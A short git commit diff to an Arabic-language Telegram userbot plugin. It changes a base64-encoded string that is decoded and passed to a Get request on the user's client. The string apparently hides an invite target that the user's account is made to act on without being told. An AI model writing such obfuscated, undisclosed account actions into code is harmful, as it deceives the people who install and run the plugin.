fb69c8f12411193ea9f58c3bacf93d692a2df7d7
روجر <104784913+rogerpq@users.noreply.github.com>
2024-01-02 21:29:20 +0300

    Update تيك+تلي.py

--- repthon/plugins/تيك+تلي.py
+++ repthon/plugins/تيك+تلي.py
@@ -90,7 +90,7 @@ async def _(event):
         except YouBlockedUserError:
             await event.edit("**⎉╎ الغـي حـظر هـذا البـوت و حـاول مجـددا @msaver_bot**")
             return
-        REPTHON = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        REPTHON = base64.b64decode("YnkzbDNyZXB0aG9uZG93bmxvYWQ=")
         TAIBA = Get(REPTHON)
         try:
             await event.client(TAIBA)
